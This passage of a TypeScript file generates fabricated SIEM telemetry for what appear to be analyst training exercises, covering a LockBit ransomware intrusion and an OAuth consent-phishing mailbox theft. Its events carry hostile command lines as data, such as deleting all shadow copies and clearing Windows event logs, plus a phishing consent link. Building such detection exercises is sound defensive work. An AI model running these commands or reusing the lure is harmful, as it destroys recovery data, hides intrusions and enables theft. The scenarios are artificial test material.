        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "2",
      },
    },
    {
      id: "evt_04c_domain_admin_logon", ts: T(93 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC-CORP-01", user_email: "da-backup@nexacorp.com",
      severity: "critical", mitre_technique: "T1078",
      description: "Domain admin account da-backup authenticated to DC-CORP-01 via a network logon (Type 3) originating from WS-FIN-1193.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonProcessName": "NtLmSsp",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": zero.hostname,
        "winlog.event_data.IpAddress": zero.ip ?? "10.10.20.33",
        "winlog.event_data.IpPort": "51889",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.KeyLength": "0",
      },
    },
    {
      id: "evt_05_smb_lateral", ts: T(105 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: zero.hostname, user_email: zero.email,
      src_ip: zero.ip, dst_ip: server.ip, dst_port: 445, protocol: "tcp",
      severity: "critical", mitre_technique: "T1021.002",
      description: `WS-FIN-1193 (${zero.ip}) opened an SMB connection to the ADMIN$ share on FS-CORP-01 (${server.ip}), authenticated with NTLM.`,
      raw: {
        "event.action": "network-connection",
        "source.ip": "10.10.20.33", "source.hostname": "WS-FIN-1193",
        "destination.ip": "10.10.10.12", "destination.port": "445",
        "destination.hostname": "FS-CORP-01",
        "network.protocol": "smb", "network.transport": "tcp",
        "authentication.method": "NTLM", "authentication.status": "success",
        "smb.share": "\\\\FS-CORP-01\\ADMIN$",
      },
    },
    {
      id: "evt_06_psexec", ts: T(106 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname, user_email: server.email, src_ip: zero.ip,
      severity: "critical", mitre_technique: "T1569.002",
      process: {
        name: "PSEXESVC.exe", pid: 3310, parent_name: "services.exe", parent_pid: 728,
        cmdline: "PSEXESVC.exe",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      file: { path: "C:\\Windows\\PSEXESVC.exe", sha256: psxHash },
      description: "PSEXESVC.exe was installed and launched as SYSTEM on FS-CORP-01, delivered remotely from WS-FIN-1193 over the ADMIN$ share.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:01:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ProcessId": "3310",
        "winlog.event_data.Image": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.CommandLine": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0003-c3d4e5f60003}",
        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\services.exe",
        "winlog.event_data.ParentProcessId": "728",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
        "winlog.event_data.Hashes": `SHA256=${psxHash}`,
        "winlog.event_data.Company": "Sysinternals - www.sysinternals.com",
        "winlog.event_data.OriginalFileName": "psexesvc.exe",
      },
    },

    // ── CORRELATED: Firewall — C2 beacon from FS-CORP-01 after PsExec ────────────
    {
      id: "evt_rsw_fw_server_c2", ts: T(110 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: server.ip, dst_ip: c2Ip, dst_port: 443,
      hostname: server.hostname,
      description: `FS-CORP-01 began sending outbound HTTPS traffic to ${c2Ip} at regular intervals.`,
      raw: {
        "event.action": "allow",
        "source.ip": server.ip,
        "destination.ip": c2Ip,
        "destination.port": "443",
        "pan.app": "ssl",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "threat.category": "CommandAndControl",
        "url.category": "Unknown",
        "network.bytes_out": "1024",
        "network.bytes_in": "8192",
      },
    },

    // ── CORRELATED: VSS snapshot status BEFORE deletion (backup was available) ───
    {
      id: "evt_rsw_vss_before", ts: T(119 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "process_create", severity: "informational",
      hostname: server.hostname,
      description: "vssadmin.exe ran list shadows on FS-CORP-01 under PSEXESVC.exe, returning 12 shadow copies.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:14:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0005-c3d4e5f60005}",
        "winlog.event_data.ProcessId": "6602",
        "winlog.event_data.Image": "C:\\Windows\\System32\\vssadmin.exe",
        "winlog.event_data.CommandLine": "vssadmin list shadows",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ParentImage": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessId": "3310",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
        "vss.oldest_shadow": "2026-04-29T02:00:00Z",
        "vss.newest_shadow": "2026-05-05T02:00:00Z",
      },
    },
    {
      id: "evt_07_vssadmin", ts: T(120 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1490",
      process: {
        name: "vssadmin.exe", pid: 7712, parent_name: "PSEXESVC.exe", parent_pid: 3310,
        cmdline: "vssadmin.exe delete shadows /all /quiet",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      description: "vssadmin.exe, launched by PSEXESVC.exe, deleted all 12 Volume Shadow Copies on FS-CORP-01.",
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.description": "vssadmin.exe invoked with 'delete shadows /all /quiet' — deletes all Volume Shadow Copies, removing the built-in recovery path immediately before mass file encryption.",
        "crowdstrike.detection.scenario": "ransomware_pre_encryption_activity",
        "crowdstrike.detection.tactic": "Impact",
        "crowdstrike.detection.tactic_id": "TA0040",
        "crowdstrike.detection.technique": "Inhibit System Recovery",
        "crowdstrike.detection.technique_id": "T1490",
        "crowdstrike.detection.severity": "Critical",
        "event.action": "process_created",
        "process.name": "vssadmin.exe", "process.pid": "7712",
        "process.command_line": "vssadmin.exe delete shadows /all /quiet",
        "process.parent.name": "PSEXESVC.exe", "process.parent.pid": "3310",
        "user.name": "NT AUTHORITY\\SYSTEM", "host.name": "FS-CORP-01",
      },
    },
    {
      id: "evt_08_log_clear", ts: T(121 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname,
      severity: "high", mitre_technique: "T1070.001",
      process: {
        name: "cmd.exe", pid: 8841, parent_name: "PSEXESVC.exe", parent_pid: 3310,
        cmdline: "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
      },
      description: "wevtutil.exe cleared the Security, System, and Application event logs on FS-CORP-01 right after the shadow copies were deleted.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T05:16:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0004-c3d4e5f60004}",
        "winlog.event_data.ProcessId": "8841",
        "winlog.event_data.Image": "C:\\Windows\\System32\\cmd.exe",
        "winlog.event_data.CommandLine": "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ParentImage": "C:\\Windows\\PSEXESVC.exe",
        "winlog.event_data.ParentProcessId": "3310",
        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
        "winlog.event_data.IntegrityLevel": "System",
      },
    },
    {
      id: "evt_08b_audit_clear", ts: T(121 * MIN + 5_000),
      source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
      hostname: "FS-CORP-01", user_email: "svc-backup@nexacorp.com",
      severity: "high", mitre_technique: "T1070.001",
      description: "Windows recorded Event 1102 on FS-CORP-01 — the Security audit log was cleared.",
      raw: {
        "event.code": "1102",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserName": "FS-CORP-01$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectLogonId": "0x3e4a2",
      },
    },

    // ── CORRELATED: Outcome — AV attempted detection at ransomware execution ──────
    {
      id: "evt_rsw_av_miss", ts: T(122 * MIN + 55_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "av_detection", severity: "medium",
      hostname: server.hostname,
      description: "CrowdStrike flagged the payload on FS-CORP-01 as a high-confidence malware detection, but the sensor was configured to log only and took no action.",
      raw: {
        "event.action": "av_detection",
        "file.path": "C:\\Windows\\Temp\\wu_update.exe",
        "file.hash.sha256": rswHash,
        "host.name": server.hostname,
        "user.name": "NT AUTHORITY\\SYSTEM",
        "policy.name": "Server-Detection-Only",
        "action_result": "logged_not_blocked",
        "quarantine.status": "not_quarantined",
      },
    },
    {
      id: "evt_09_ransom_exec", ts: T(123 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_detection",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1486",
      file: { path: "C:\\Windows\\Temp\\wu_update.exe", sha256: rswHash },
      description: `CrowdStrike detected wu_update.exe (LockBit 3.0) running as SYSTEM on FS-CORP-01 but did not block it — the server policy is set to detection-only.`,
      raw: {
        "event.action": "av_detection",
        "file.path": "C:\\Windows\\Temp\\wu_update.exe",
        "file.hash.sha256": rswHash,
        "file.name": "wu_update.exe",
        "host.name": "FS-CORP-01",
        "user.name": "NT AUTHORITY\\SYSTEM",
        "malware.name": "LockBit.3.0", "malware.family": "LockBit", "malware.type": "Ransomware",
        "action_result": "detected_not_blocked",
        "policy.name": "Server-Detection-Only",
        "quarantine.status": "not_quarantined",
      },
    },
    {
      id: "evt_10_encryption", ts: T(124 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_modify",
      hostname: server.hostname,
      severity: "critical", mitre_technique: "T1486",
      description: "2,847 files (18GB) across the Finance, HR, and Contracts shares on FS-CORP-01 were renamed with a .locked extension in 90 seconds.",
      raw: {
        "event.action": "mass_file_encryption",
        "host.name": "FS-CORP-01",
        "user.name": "NT AUTHORITY\\SYSTEM",
        "files.encrypted_count": "2847", "files.extension_added": ".locked",
        "file.ransom_note": "Restore-My-Files.txt",
        "storage.size": "18 GB",
        "shares.affected": "Finance, HR, Contracts",
      },
    },
    {
      id: "evt_11_ransom_note", ts: T(125 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: server.hostname,
      severity: "high", mitre_technique: "T1486",
      file: { path: "C:\\Shares\\Finance\\Restore-My-Files.txt" },
      description: "Restore-My-Files.txt was dropped into 14 shared folders on FS-CORP-01, demanding 0.25 BTC within 72 hours via a dark web payment link.",
      raw: {
        "event.action": "file_created",
        "file.name": "Restore-My-Files.txt",
        "file.path": "C:\\Shares\\Finance\\Restore-My-Files.txt",
        "host.name": "FS-CORP-01",
        "ransom.demand_btc": "0.25", "ransom.deadline_hours": "72",
        "ransom.copies_dropped": "14",
        "url.full": "http://lockbit3olp7oetlc.onion",
      },
    },

    // ── CORRELATED: Baseline — last normal file access by c.martin before ransom ─
    {
      id: "evt_rsw_baseline_file", ts: T(-5 * MIN), is_baseline: true,
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_access", severity: "informational",
      hostname: zero.hostname, user_email: zero.email,
      description: "c.martin opened Budget_Q2_2026.xlsx from the Finance share on FS-CORP-01.",
      raw: {
        "event.action": "FileAccessed",
        "file.path": "\\\\FS-CORP-01\\Finance\\Budget_Q2_2026.xlsx",
        "file.name": "Budget_Q2_2026.xlsx",
        "user.name": "NEXACORP\\cmartin",
        "host.name": zero.hostname,
        "source.ip": zero.ip,
        "event.outcome": "success",
      },
    },
  ];

  return { title: "Ransomware Outbreak — LockBit 3.0", events, T, MIN, zero, server, c2Ip, c2Dom, rswHash, psxHash };
}

/** Telemetry half of `buildOAuthScenario`: the events and the story title, no answer key. */
export function oauthScenarioEvents() {
  const B = new Date("2026-05-06T02:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HR  = 60 * MIN;

  const victim     = { hostname: "MBP-SCHEN-01", email: "s.chen@nexacorp.com",  ip: "10.10.50.18" };
  const sprayIp    = "91.108.56.199";
  // Story-specific (the 185.220.101.0/24 Tor range was shared across storylines).
  const sessionIp  = "193.233.20.57";
  const appId      = "3a7f8b2c-d491-4e6a-9f3b-1c5d8e7a2b4f";

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_spray", ts: T(0),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_failure",
      user_email: victim.email, src_ip: sprayIp,
      severity: "high", mitre_technique: "T1110.003",
      description: `Entra ID recorded a failed sign-in (50126, invalid password) for s.chen from ${sprayIp} (Frankfurt) — one of a burst of failures against different accounts from this IP that began at 02:30.`,
      raw: {
        // Entra ID sign-in failure — one representative record of the spray
        "azure.signinlogs.correlation_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "azure.signinlogs.user_principal_name": "s.chen@nexacorp.com",
        "azure.signinlogs.resultType": "50126",
        "azure.signinlogs.result_description": "Invalid username or password",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "singleFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "medium",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.location.country_or_region": "DE",
        "azure.signinlogs.location.city": "Frankfurt",
        // REMOVED: a full Windows Security 4625 that used to sit here alongside
        // the Entra fields — 21 winlog keys in the same raw block as 12
        // azure.signinlogs keys.
        //
        // No SIEM produces that record. They are two different products
        // describing two different authentication systems, and a Microsoft 365
        // password spray does not generate an on-prem 4625 at all unless
        // pass-through authentication or ADFS is in play, neither of which this
        // environment establishes. It also carried invented
        // `Status_description` / `SubStatus_description` translation fields,
        // which hand over exactly what a student is meant to look up.
        //
        // An analyst told to pivot on this raw block was reading something that
        // could not exist.
        // ECS fields
        "event.code": "50126",
        "event.action": "logon-failed",
        "event.outcome": "failure",
        "event.created": "2026-05-06T02:30:00.000Z",
        "authentication.status": "failure",
        "authentication.failure_reason": "wrong_password",
        "source.ip": sprayIp,
        "source.geo.country_name": "Germany",
      },
    },
    {
      id: "evt_02_mfa_accept", ts: T(10 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1078",
      description: `s.chen signed in successfully from Germany (${sprayIp}) at 02:40 after approving an MFA push.`,
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push (s.chen, Germany)
        "azure.signinlogs.correlation_id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "azure.signinlogs.resultType": "0",
        "azure.signinlogs.result_description": "Successfully signed in",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "high",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "s.chen@nexacorp.com",
        "azure.signinlogs.user_display_name": "Sarah Chen",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.device_detail.browser": "Chrome 124.0.0",
        "azure.signinlogs.device_detail.operating_system": "macOS",
        "azure.signinlogs.device_detail.device_id": "(not registered)",
        "azure.signinlogs.device_detail.is_compliant": "false",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.location.city": "Frankfurt",
        "azure.signinlogs.location.country_or_region": "DE",
        // ECS fields
        "event.action": "UserLoggedIn",
        "event.outcome": "success",
        "event.created": "2026-05-06T02:40:00.000Z",
        "user.email": "s.chen@nexacorp.com",
        "user.title": "Senior Product Engineer",
        "source.ip": sprayIp,
        "source.geo.country_name": "Germany",
        "authentication.status": "success",
        "authentication.mfa": "Authenticator App Push",
        "authentication.factor": "push_notification",
        "risk.level": "High",
        "logon.local_time": "02:40",
        "ca_policy_applied": "none",
      },
    },

    // ── CORRELATED: Phishing email that led to s.chen clicking the OAuth consent ─
    {
      id: "evt_oauth_phish_email", ts: T(12 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365",
      event_type: "email_received", severity: "high",
      user_email: victim.email, src_ip: "91.108.56.207",
      mitre_technique: "T1566.002",
      description: "s.chen received an email posing as a Microsoft security alert and containing an OAuth consent link.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "security-alert@microsoftupdate-secure.xyz",
        "email.to.address": victim.email,
        "email.subject": "Action Required: Verify Your Microsoft Security Settings",
        "email.direction": "inbound",
        "source.ip": "91.108.56.207",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "email.links": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=3a7f8b2c-d491-4e6a-9f3b-1c5d8e7a2b4f&scope=Mail.ReadWrite+Files.ReadWrite.All",
        "url.malicious_detected": "false",
        "data.office365.SafeLinks.Bypassed": "true",
        "action_result": "delivered",
      },
    },
    {
      id: "evt_03_app_register", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1098.001",
      description: `An app named MicrosoftSecurityUpdate was registered in s.chen's tenant from ${sprayIp}, published by microsoftupdate-secure.xyz, requesting Mail.ReadWrite and Files.ReadWrite.All.`,
      raw: {
        // O365 UAL + Entra ID Audit Log — Add application
        "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f7",
        "data.office365.RecordType": "8",
        "data.office365.CreationTime": "2026-05-06T02:45:00Z",
        "data.office365.Operation": "Add application",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        // Entra ID Audit Log fields
        "azure.auditlogs.operationName": "Add application",
        "azure.auditlogs.category": "ApplicationManagement",
        "azure.auditlogs.correlation_id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "azure.auditlogs.target_resources.id": appId,
        "azure.auditlogs.target_resources.display_name": "MicrosoftSecurityUpdate",
        "azure.auditlogs.target_resources.type": "Application",
        // OAuth app detail fields
        "oauth.app.id": appId,
        "oauth.app.name": "MicrosoftSecurityUpdate",
        "oauth.app.publisher_domain": "microsoftupdate-secure.xyz",
        "oauth.app.publisher_verified": "false",
        "oauth.app.requested_permissions": "Mail.ReadWrite|Files.ReadWrite.All|User.ReadBasic.All",
        "oauth.app.redirect_uris": "https://microsoftupdate-secure.xyz/auth/callback",
        "oauth.app.key_credentials_added": "true",
        // ECS fields
        "event.action": "Add application",
        "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sprayIp,
        "application.name": "MicrosoftSecurityUpdate",
        "application.id": appId,
        "application.type": "OAuth2",
      },
    },
    {
      id: "evt_04_consent", ts: T(16 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1528",
      description: "s.chen granted the MicrosoftSecurityUpdate app consent to Mail.ReadWrite, Files.ReadWrite.All and User.ReadBasic.All. The consent was recorded from 91.108.56.199.",
      raw: {
        // O365 UAL + Entra ID Audit Log — Consent to application
        "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a2",
        "data.office365.RecordType": "8",
        "data.office365.CreationTime": "2026-05-06T02:46:00Z",
        "data.office365.Operation": "Consent to application",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        // Entra ID Audit Log fields
        "azure.auditlogs.category": "ApplicationManagement",
        // OAuth consent detail fields
        // Self-consent: the only kind an ordinary user can grant. It was
        // logged as "AllPrincipals" with is_admin_consent false, which is a
        // contradiction — AllPrincipals is tenant-wide admin consent by
        // definition and a non-admin cannot produce it.
        "oauth.consent.type": "Principal",
        "oauth.consent.scopes_granted": "Mail.ReadWrite|Files.ReadWrite.All|User.ReadBasic.All",
        "oauth.consent.principal_type": "User",
        "oauth.consent.is_admin_consent": "false",
        "oauth.consent.tenant_wide": "false",
        // ECS fields
        "event.action": "Consent to application",
        "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sprayIp,
        "application.id": appId,
        "application.name": "MicrosoftSecurityUpdate",
        "iam.permission": "Mail.ReadWrite, Files.ReadWrite.All",
      },
    },

    // ── CORRELATED: Immediate mailbox access via Graph API after consent ──────────
    {
      id: "evt_oauth_immediate_mailbox", ts: T(17 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: sprayIp,
      mitre_technique: "T1114.002",
      description: "The MicrosoftSecurityUpdate app signed in to s.chen's mailbox via Graph API one minute after consent was granted.",
      raw: {
        "event.action": "MailboxLogin",
        "event.outcome": "success",
        "data.office365.Operation": "MailboxLogin",
        "data.office365.ClientIP": sprayIp,
        "data.office365.UserId": victim.email,
        "application.id": appId,
        "application.name": "MicrosoftSecurityUpdate",
        "authentication.method": "OAuth2",
        "mail.folder_accessed": "Inbox",
        "source.ip": sprayIp,
      },
    },
    {
      id: "evt_05_graph_mail_1", ts: T(1 * HR + 15 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `The MicrosoftSecurityUpdate app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp}.`,
      raw: {
        "event.action": "MailItemsAccessed", "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        // Representative record — MailItemsAccessed is written per sync/bind
        // operation; the 187-item total (see description) is a SIEM-side
        // aggregate across many records, not a count field on this one.
        "mail.folder": "Inbox",
        "authentication.method": "OAuth2",
      },
    },
    {
      id: "evt_06_pw_reset", ts: T(7 * HR),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: "10.10.1.5",
      severity: "medium",
      description: "IT helpdesk reset s.chen's password (ticket INC-4821) after a suspicious sign-in report.",
      raw: {
        // O365 UAL + Entra ID Audit Log — Reset user password (helpdesk action)
        "data.office365.Id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c4",
        "data.office365.RecordType": "8",
        "data.office365.CreationTime": "2026-05-06T09:30:00Z",
        "data.office365.Operation": "Reset user password",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "it-helpdesk@nexacorp.com",
        "data.office365.ObjectId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": "10.10.1.5",
        // Entra ID Audit Log fields
        "azure.auditlogs.category": "UserManagement",
        "azure.auditlogs.initiated_by": "it-helpdesk@nexacorp.com",
        "azure.auditlogs.target_user.upn": "s.chen@nexacorp.com",
        // Helpdesk context
        "helpdesk.ticket": "INC-4821",
        "helpdesk.reason": "User reported suspicious sign-in activity",
        // ECS fields
        "event.action": "Reset user password",
        "event.outcome": "success",
        "target.user.email": "s.chen@nexacorp.com",
        "user.email": "it-helpdesk@nexacorp.com",
        "source.ip": "10.10.1.5",
        "oauth.consent_revoked": "false",
      },
    },
    {
      id: "evt_07_graph_mail_2", ts: T(9 * HR + 30 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: "The MicrosoftSecurityUpdate app read 143 more emails from s.chen's inbox via Graph API, 2.5 hours after the password reset.",
      raw: {
        "event.action": "MailItemsAccessed", "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        // Representative record — the 143-item total (see description) is a
        // SIEM-side aggregate across many MailItemsAccessed records.
        "mail.folder": "Inbox",
        "authentication.method": "OAuth2",
      },
    },
    {
      id: "evt_08_sharepoint_dl", ts: T(11 * HR),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "critical", mitre_technique: "T1530",
      description: "The app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API.",
      network: { bytes_out: 27_100_000 },
      raw: {
        "event.action": "FileDownloaded", "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "file.name": "RoadmapQ4-Confidential.pptx",
        "file.size": "27100000",
        "cloud.resource.name": "/sites/ProductEngineering",
        "storage.classification": "Restricted",
        "network.bytes_out": "27100000",
      },
    },
    {
      id: "evt_09_onedrive_bulk", ts: T(12 * HR + 30 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "critical", mitre_technique: "T1530",
      description: "89 files (340MB, including 12 marked Confidential and 4 Restricted) were bulk-downloaded from s.chen's OneDrive in 8 minutes via the same app.",
      network: { bytes_out: 340_000_000 },
      raw: {
        // Representative record — FileDownloaded is written per file; the
        // 89-file / 340MB total (see description) is a SIEM-side aggregate
        // across many records, not a count field on any single one.
        "event.action": "FileDownloaded", "event.outcome": "success",
        "user.email": "s.chen@nexacorp.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "file.name": "Q3-Compensation-Review.xlsx",
        "cloud.resource.name": "/personal/s_chen_nexacorp_com/Documents",
        "storage.classification": "Confidential",
        "file.size": "3820000",
        "network.bytes_out": "3820000",
      },
    },
    {
      // Vendor changed from "Microsoft 365 Unified Audit Log" — a raw audit
      // trail does not itself produce an anomaly finding. This is a Sentinel
      // analytics-rule alert on the OAuth app's activity pattern, which is
      // the product that actually emits event_type "ueba_anomaly" here.
      id: "evt_10_app_still_active", ts: T(16 * HR),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ueba_anomaly",
      user_email: victim.email,
      severity: "high",
      description: "A Sentinel analytics rule reported the MicrosoftSecurityUpdate app as still active after s.chen's password reset, with 330 emails and 89 files accessed since consent.",
      raw: {
        "event.action": "AlertGenerated",
        "AlertName": "OAuthApp_ActiveAfterCredentialReset",
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "ExtendedProperties.Mail Items Accessed": 330,
        "ExtendedProperties.Files Accessed": 89,
        "ExtendedProperties.Password Reset Time": T(7 * HR),
        "user.email": "s.chen@nexacorp.com",
        "SuspiciousOAuthConsent": "true",
        // Named after what the product actually flagged — the token was
        // never revoked, not an inference about "compromise" the raw record
        // itself cannot make.
        "alert.name": "OAuth app with mail/file access remains active — token not revoked",
        "alert.description": "Application MicrosoftSecurityUpdate continues to call Microsoft Graph with the consented Mail.ReadWrite and Files.ReadWrite.All scopes; the OAuth grant has not been revoked.",
        "alert.status": "open",
      },
    },

    // ── CORRELATED: Baseline — s.chen normal Okta login from Israel ──────────────
    {
      id: "evt_oauth_baseline", ts: T(-60 * MIN), is_baseline: true,
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email,
      src_ip: "77.125.38.201",
      description: "s.chen logged in to Okta from Tel Aviv on a registered, managed MacBook.",
      raw: {
        "okta.eventType": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.login": victim.email,
        "okta.client.ipAddress": "77.125.38.201",
        "okta.client.geographicalContext.country": "IL",
        "okta.client.geographicalContext.city": "Tel Aviv",
        "okta.authenticationContext.authType": "PASSWORD_IDP",
        "okta.risk.level": "LOW",
        "okta.device.registered": "true",
        "okta.device.managed": "true",
        "GeoLocation.country_name": "Israel",
        "GeoLocation.city_name": "Tel Aviv",
